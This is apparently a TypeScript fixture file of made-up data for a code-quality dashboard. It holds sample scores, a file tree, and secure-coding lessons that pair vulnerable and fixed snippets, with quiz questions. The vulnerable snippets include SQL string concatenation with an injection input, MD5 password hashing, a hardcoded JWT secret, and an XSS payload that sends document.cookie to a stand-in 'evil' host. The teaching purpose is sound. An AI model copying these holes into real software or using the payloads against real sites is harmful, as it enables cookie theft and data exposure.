import type { Concept, Dimension, FileNode, RepoScore, RunStage, SkillSignal } from "@/lib/types";

export const REPO = {
  name: "acme/checkout-service",
  branch: "feat/order-search",
  baseBranch: "main",
  pr: 4127,
  commit: "e91c4ad",
  lastRun: "2 minutes ago",
  files: 312,
  loc: 48219,
};

/**
 * A finished run's stages, for the sample review.
 *
 * These numbers are invented, which is exactly why they live in `data/` with
 * every other fixture instead of inside the component that renders them. The
 * empty state used to carry its own hardcoded engine table, so a REAL run
 * rendered fabricated timings for engines that had not run — the fixtures were
 * indistinguishable from the product. Anything invented belongs here, and only
 * here, where `USE_FIXTURES` decides whether it is ever seen.
 *
 * Deliberately not all-green: `verify` is degraded in the product too, and a
 * sample screen where everything succeeds hides the state that needs design.
 */
export const RUN_STAGES: RunStage[] = [
  { id: "clone", label: "Cloning repository", status: "complete", durationMs: 1_180, findings: 0 },
  { id: "detect", label: "Detecting languages", status: "complete", durationMs: 240, findings: 0 },
  { id: "static", label: "Static analysis", engine: "eslint", status: "complete", durationMs: 6_400, findings: 9 },
  { id: "security", label: "Security scan", engine: "semgrep", status: "complete", durationMs: 18_900, findings: 4 },
  { id: "complexity", label: "Complexity & duplication", engine: "sonarjs", status: "complete", durationMs: 11_400, findings: 6 },
  { id: "ai", label: "AI review", engine: "codementor-ai", status: "complete", durationMs: 23_800, findings: 5 },
  {
    id: "verify",
    label: "Verifying fixes",
    status: "degraded",
    durationMs: 90,
    findings: 0,
    note: "Fix verification arrives with the worktree loop (Milestone 9)",
  },
  { id: "score", label: "Scoring", status: "complete", durationMs: 120, findings: 0 },
];

export const RUN_DURATION_MS = 62_130;

export const BRANCHES = [
  { name: "feat/order-search", score: 34, delta: -18, active: true },
  { name: "main", score: 52, delta: 0, active: false },
  { name: "fix/coupon-rounding", score: 61, delta: 9, active: false },
  { name: "chore/bump-node-22", score: 51, delta: -1, active: false },
];

/** Includes a 12-segment path on purpose — the tree must not blow out. */
export const FILE_TREE: FileNode[] = [
  {
    path: "src",
    name: "src",
    type: "dir",
    children: [
      {
        path: "src/routes",
        name: "routes",
        type: "dir",
        children: [
          {
            path: "src/routes/orders.js",
            name: "orders.js",
            type: "file",
            language: "javascript",
            loc: 4218,
            findings: 8,
            worst: "critical",
            coverage: 41,
            duplication: 6.2,
          },
          {
            path: "src/routes/checkout.js",
            name: "checkout.js",
            type: "file",
            language: "javascript",
            loc: 1902,
            findings: 5,
            worst: "high",
            coverage: 63,
            duplication: 2.1,
          },
          {
            path: "src/routes/webhooks.js",
            name: "webhooks.js",
            type: "file",
            language: "javascript",
            loc: 640,
            findings: 2,
            worst: "medium",
            coverage: 78,
            duplication: 0,
          },
          {
            path: "src/routes/health.js",
            name: "health.js",
            type: "file",
            language: "javascript",
            loc: 42,
            findings: 0,
            coverage: 100,
            duplication: 0,
          },
        ],
      },
      {
        path: "src/db",
        name: "db",
        type: "dir",
        children: [
          {
            path: "src/db/pool.js",
            name: "pool.js",
            type: "file",
            language: "javascript",
            loc: 210,
            findings: 3,
            worst: "high",
            coverage: 55,
            duplication: 0,
          },
          {
            path: "src/db/migrations/2024_11_04_add_coupon_index.sql",
            name: "2024_11_04_add_coupon_index.sql",
            type: "file",
            language: "sql",
            loc: 18,
            findings: 1,
            worst: "low",
          },
        ],
      },
      {
        path: "src/lib",
        name: "lib",
        type: "dir",
        children: [
          {
            path: "src/lib/templates.js",
            name: "templates.js",
            type: "file",
            language: "javascript",
            loc: 388,
            findings: 4,
            worst: "high",
            coverage: 30,
            duplication: 11.4,
          },
          {
            path: "src/lib/vendor/legacy/adapters/payments/providers/stripe/v2/internal/normalizers/currency/rounding-strategy.js",
            name: "rounding-strategy.js",
            type: "file",
            language: "javascript",
            loc: 96,
            findings: 2,
            worst: "medium",
            coverage: 0,
            duplication: 0,
          },
        ],
      },
      {
        path: "src/middleware",
        name: "middleware",
        type: "dir",
        children: [
          {
            path: "src/middleware/auth.js",
            name: "auth.js",
            type: "file",
            language: "javascript",
            loc: 174,
            findings: 6,
            worst: "critical",
            coverage: 48,
            duplication: 0,
          },
          {
            path: "src/middleware/rate-limit.js",
            name: "rate-limit.js",
            type: "file",
            language: "javascript",
            loc: 88,
            findings: 1,
            worst: "low",
            coverage: 92,
            duplication: 0,
          },
        ],
      },
    ],
  },
  {
    path: "tests",
    name: "tests",
    type: "dir",
    children: [
      {
        path: "tests/orders.spec.js",
        name: "orders.spec.js",
        type: "file",
        language: "javascript",
        loc: 512,
        findings: 0,
        coverage: 100,
      },
    ],
  },
];

/* -- scoring ---------------------------------------------------------------- */

export const DIMENSIONS: Dimension[] = [
  {
    key: "security",
    label: "Security",
    score: 18,
    rating: "E",
    weight: 30,
    delta: -31,
    reason: "2 new SQL injections on the order-search path; both reachable from an unauthenticated route.",
  },
  {
    key: "reliability",
    label: "Reliability",
    score: 46,
    rating: "D",
    weight: 20,
    delta: -12,
    reason: "An unawaited db.query in the DELETE handler can crash the process on rejection.",
  },
  {
    key: "performance",
    label: "Performance",
    score: 39,
    rating: "D",
    weight: 15,
    delta: -22,
    reason: "N+1 query inside a quadratic loop moved p95 checkout from 180ms to 840ms.",
  },
  {
    key: "maintainability",
    label: "Maintainability",
    score: 51,
    rating: "D",
    weight: 15,
    delta: -6,
    reason: "Cognitive complexity in createOrder rose 34 → threshold is 15; duplication up 1.8pt.",
  },
  {
    key: "readability",
    label: "Readability",
    score: 62,
    rating: "C",
    weight: 8,
    delta: 3,
    reason: "Consistent naming in the new handlers offset one 428-character line.",
  },
  {
    key: "documentation",
    label: "Documentation",
    score: 44,
    rating: "D",
    weight: 5,
    delta: 0,
    reason: "No change — 2 of 9 exported functions carry JSDoc, same as main.",
  },
  {
    key: "tests",
    label: "Tests",
    score: 41,
    rating: "D",
    weight: 7,
    delta: -9,
    reason: "142 new lines, 38 covered. New-code coverage 26.8% against a 80% gate.",
  },
];

export const SCORE: RepoScore = {
  overall: 34,
  delta: -18,
  baseline: "main",
  rating: "E",
  debtMinutes: 1_055,
  debtRatio: 4.9,
  coverage: 26.8,
  duplication: 6.2,
  loc: 48_219,
  dimensions: DIMENSIONS,
  gate: {
    status: "failed",
    conditions: [
      { metric: "Security rating on new code", operator: "<=", threshold: 1, actual: 5, status: "failed" },
      { metric: "Coverage on new code", operator: ">=", threshold: 80, actual: 26.8, unit: "%", status: "failed" },
      { metric: "Duplicated lines on new code", operator: "<=", threshold: 3, actual: 6.2, unit: "%", status: "failed" },
      { metric: "Maintainability rating", operator: "<=", threshold: 4, actual: 4, status: "passed" },
      { metric: "Blocker issues", operator: "<=", threshold: 0, actual: 2, status: "failed" },
    ],
  },
};

/** Last 30 commits — overall score trend. */
export const TREND = [
  52, 52, 54, 53, 55, 55, 51, 50, 52, 56, 58, 57, 57, 59, 61, 60, 58, 57, 55, 54, 56, 55, 53, 52,
  52, 51, 49, 44, 38, 34,
].map((score, i) => ({
  commit: `c${(i + 1).toString().padStart(2, "0")}`,
  sha: Math.random().toString(16).slice(2, 9),
  score,
  idx: i,
}));

/** Findings by severity over the same window. */
export const SEVERITY_TREND = Array.from({ length: 30 }, (_, i) => {
  const ramp = i > 25 ? (i - 25) : 0;
  return {
    idx: i,
    commit: `c${(i + 1).toString().padStart(2, "0")}`,
    critical: Math.max(0, Math.round(1 + ramp * 0.6 + (i > 20 ? 1 : 0))),
    high: Math.max(0, Math.round(3 + ramp * 1.1 + Math.sin(i / 3) * 1.2)),
    medium: Math.max(0, Math.round(7 + Math.sin(i / 2) * 2 + ramp)),
    low: Math.max(0, Math.round(11 + Math.cos(i / 4) * 3)),
  };
});

export const TOP_OFFENDERS = [
  { path: "src/routes/orders.js", findings: 8, critical: 2, debt: 135, loc: 4218, trend: "worse" as const },
  { path: "src/middleware/auth.js", findings: 6, critical: 1, debt: 190, loc: 174, trend: "worse" as const },
  { path: "src/routes/checkout.js", findings: 5, critical: 0, debt: 95, loc: 1902, trend: "flat" as const },
  { path: "src/lib/templates.js", findings: 4, critical: 0, debt: 240, loc: 388, trend: "better" as const },
  { path: "src/db/pool.js", findings: 3, critical: 0, debt: 60, loc: 210, trend: "flat" as const },
  {
    path: "src/lib/vendor/legacy/adapters/payments/providers/stripe/v2/internal/normalizers/currency/rounding-strategy.js",
    findings: 2,
    critical: 0,
    debt: 45,
    loc: 96,
    trend: "flat" as const,
  },
];

/* -- learning --------------------------------------------------------------- */

export const SKILL_HEADLINE = {
  metric: 47,
  window: "three months",
  detail: "Across 1,284 findings on 39 branches, you now repeat a previously-explained mistake less than half as often.",
  repeatsThen: 31,
  repeatsNow: 16,
};

export const SKILL_SIGNALS: SkillSignal[] = [
  { concept: "N+1 queries", conceptId: "n-plus-one", trend: "regressing", occurrences: 5, changePct: 25 },
  { concept: "Safe error handling", conceptId: "error-handling", trend: "flat", occurrences: 4, changePct: 0 },
  { concept: "Parameterized queries", conceptId: "parameterized-queries", trend: "improving", occurrences: 3, changePct: -62 },
  { concept: "Output encoding & XSS", conceptId: "output-encoding", trend: "improving", occurrences: 2, changePct: -40 },
  { concept: "Password hashing", conceptId: "password-hashing", trend: "improving", occurrences: 2, changePct: -33 },
  { concept: "Secret management", conceptId: "secret-management", trend: "improving", occurrences: 1, changePct: -80 },
];

export const CONCEPTS: Concept[] = [
  {
    id: "parameterized-queries",
    title: "Parameterized queries",
    category: "Injection",
    difficulty: "Beginner",
    readMinutes: 4,
    mastery: "practising",
    timesHit: 3,
    relatedCwe: "CWE-89",
    summary:
      "Send SQL and data to the database on separate channels so user input can never be parsed as instruction.",
    keyPoints: [
      "The driver sends the statement first, then the values. The parser has already finished by the time your data arrives.",
      "Escaping is a filter and filters have gaps. Binding is structural — there is no input that escapes it.",
      "Parameters bind values, never identifiers. Dynamic table or column names need an allow-list.",
      "An ORM is not automatically safe: raw fragments and `LIKE` concatenation reintroduce the same hole.",
    ],
    vulnerable: {
      language: "javascript",
      code: `const q = "SELECT * FROM orders WHERE id = '" + req.params.id + "'";
const rows = await db.query(q);
// GET /orders/1' OR '1'='1  ->  every row`,
    },
    safe: {
      language: "javascript",
      code: `const q = 'SELECT * FROM orders WHERE id = $1';
const rows = await db.query(q, [req.params.id]);
// the id is a value, never syntax`,
    },
    question: {
      prompt: "Which of these is still injectable after switching to bound parameters?",
      options: [
        "WHERE id = $1",
        "ORDER BY ' + req.query.sort",
        "WHERE name ILIKE $1 with '%' + term + '%' passed as the value",
        "WHERE created_at > $1",
      ],
      answerIndex: 1,
      explain:
        "Parameters bind values, not identifiers. A column name in ORDER BY cannot be bound, so it must come from an allow-list. Option 3 is safe — the wildcards are part of the value, which is exactly what binding protects.",
    },
  },
  {
    id: "output-encoding",
    title: "Output encoding & XSS",
    category: "Cross-site scripting",
    difficulty: "Intermediate",
    readMinutes: 6,
    mastery: "learning",
    timesHit: 2,
    relatedCwe: "CWE-79",
    summary:
      "Escape at the moment of rendering, in the encoding of the context you are rendering into — HTML body, attribute, URL and JavaScript each need a different one.",
    keyPoints: [
      "Encode on output, not on input. Input sanitisation loses data and only covers the fields you remembered.",
      "Context decides the encoder. HTML-escaping a value that lands inside a <script> block does not protect you.",
      "Stored XSS outranks reflected: the payload needs only to be viewed, not delivered.",
      "A template engine that auto-escapes is the cheapest durable fix; string concatenation defeats it.",
    ],
    vulnerable: {
      language: "javascript",
      code: `const html = '<div>' + row.description + '</div>';
res.send(html);
// description = <img src=x onerror=fetch('//evil/'+document.cookie)>`,
    },
    safe: {
      language: "javascript",
      code: `const html = \`<div>\${escapeHtml(row.description)}</div>\`;
res.send(html);
// < becomes &lt; — the browser renders text, not a tag`,
    },
    question: {
      prompt: "A value is rendered into `<a href=\"USER_INPUT\">`. HTML-escaping it is enough. True?",
      options: ["True", "False"],
      answerIndex: 1,
      explain:
        "No. `javascript:alert(1)` contains no HTML metacharacters, so escaping passes it through untouched. URL contexts need scheme validation on top of attribute encoding.",
    },
  },
  {
    id: "n-plus-one",
    title: "N+1 queries",
    category: "Performance",
    difficulty: "Intermediate",
    readMinutes: 6,
    mastery: "learning",
    timesHit: 5,
    summary:
      "One query to get a list, then one more per row. Fast on ten rows in development, fatal on ten thousand in production.",
    keyPoints: [
      "Cost is round-trips, not rows. 200 sequential 3ms queries is 600ms of pure latency.",
      "Batch with `WHERE id = ANY($1)` or a join, then stitch in memory.",
      "Lazy-loaded ORM relations are the usual culprit and are invisible in the source.",
      "Assert query *count* in tests — it is the only regression check that survives refactoring.",
    ],
    vulnerable: {
      language: "javascript",
      code: `for (const item of items) {
  const p = await db.query('SELECT price FROM products WHERE sku = $1', [item.sku]);
  total += p.rows[0].price * item.quantity;
}`,
    },
    safe: {
      language: "javascript",
      code: `const skus = items.map((i) => i.sku);
const { rows } = await db.query(
  'SELECT sku, price FROM products WHERE sku = ANY($1)', [skus]);
const price = new Map(rows.map((r) => [r.sku, r.price]));`,
    },
    question: {
      prompt: "Your endpoint runs 1 + N queries at 3ms each. N is 200. Roughly what latency does batching remove?",
      options: ["~6ms", "~60ms", "~600ms", "~6s"],
      answerIndex: 2,
      explain:
        "200 sequential round-trips at 3ms is ~600ms, and batching replaces them with one. The query planner work barely changes — you are buying back network latency.",
    },
  },
  {
    id: "password-hashing",
    title: "Password hashing",
    category: "Cryptography",
    difficulty: "Intermediate",
    readMinutes: 7,
    mastery: "practising",
    timesHit: 2,
    relatedCwe: "CWE-916",
    summary:
      "Password storage needs a slow, memory-hard, per-user-salted KDF. Fast hashes are the wrong tool by design.",
    keyPoints: [
      "MD5 and SHA-256 are built to be fast — exactly the property an attacker wants.",
      "Argon2id is the default recommendation; bcrypt is acceptable where a native build is impractical.",
      "Salt is per-user and stored alongside the hash. It defeats rainbow tables, not brute force.",
      "You cannot re-hash existing passwords in place. Wrap, mark the algorithm, and upgrade on next login.",
    ],
    vulnerable: {
      language: "javascript",
      code: `return crypto.createHash('md5').update(pw).digest('hex');
// ~50 billion candidates/sec on one commodity GPU`,
    },
    safe: {
      language: "javascript",
      code: `return argon2.hash(pw, {
  type: argon2.argon2id,
  memoryCost: 19456, // 19 MiB
  timeCost: 2,
});`,
    },
    question: {
      prompt: "Why does memory-hardness matter more than iteration count against a well-funded attacker?",
      options: [
        "It makes the hash longer",
        "GPUs and ASICs scale compute far more cheaply than they scale memory bandwidth",
        "It prevents rainbow tables",
        "It allows a shorter salt",
      ],
      answerIndex: 1,
      explain:
        "Parallel hardware wins on raw compute. Forcing each guess to hold ~19MiB collapses the number of cores that can run concurrently, which is the lever iteration count alone does not pull.",
    },
  },
  {
    id: "error-handling",
    title: "Safe error handling",
    category: "Information exposure",
    difficulty: "Beginner",
    readMinutes: 3,
    mastery: "learning",
    timesHit: 4,
    relatedCwe: "CWE-209",
    summary: "Log the detail, return the category. The client learns that it failed, not how.",
    keyPoints: [
      "Stack traces expose paths, versions and query text — a free reconnaissance report.",
      "Return a stable error code the client can branch on, plus a correlation id for support.",
      "Log structurally, once, at the boundary. `console.log(err)` in a handler loses request context.",
      "Never let injection attempts learn from your SQL errors.",
    ],
    vulnerable: {
      language: "javascript",
      code: `catch (err) {
  console.log(err);
  res.status(500).send(err.stack);
}`,
    },
    safe: {
      language: "javascript",
      code: `catch (err) {
  logger.error({ err, requestId: req.id, route: '/orders/:id' });
  res.status(500).json({ error: 'Internal error', requestId: req.id });
}`,
    },
    question: {
      prompt: "Which of these is safe to return to an unauthenticated caller?",
      options: [
        "err.stack",
        "err.message from the database driver",
        "A stable error code plus a request id",
        "The failing SQL with values redacted",
      ],
      answerIndex: 2,
      explain:
        "Only the last one carries no internal detail while still letting support correlate the failure. Driver messages routinely include table and column names.",
    },
  },
  {
    id: "secret-management",
    title: "Secret management",
    category: "Secrets",
    difficulty: "Beginner",
    readMinutes: 5,
    mastery: "mastered",
    timesHit: 1,
    relatedCwe: "CWE-798",
    summary:
      "Secrets live in the environment or a vault, never in the tree. A committed secret is public from the moment it is pushed.",
    keyPoints: [
      "Removing the line does not remove the secret — git history keeps it. Rotate.",
      "Fail loudly at boot when a required secret is missing; a silent fallback is how dev keys reach production.",
      "Symmetric JWT keys are signing *and* verification keys: repo read access equals account takeover.",
      "Scan pre-commit. Detection after the push is incident response, not prevention.",
    ],
    vulnerable: {
      language: "javascript",
      code: `jwt.sign({ uid }, 'dev-secret-do-not-ship', { algorithm: 'HS256' });`,
    },
    safe: {
      language: "javascript",
      code: `const secret = process.env.JWT_SIGNING_KEY;
if (!secret) throw new Error('JWT_SIGNING_KEY is not configured');
jwt.sign({ uid }, secret, { algorithm: 'HS256', expiresIn: '15m' });`,
    },
    question: {
      prompt: "You move a hard-coded key to an env var and deploy. Is the incident closed?",
      options: ["Yes", "No — the key is still in history and must be rotated"],
      answerIndex: 1,
      explain:
        "Every clone, fork and CI cache still holds the original value. Treat any committed secret as disclosed and rotate it.",
    },
  },
];
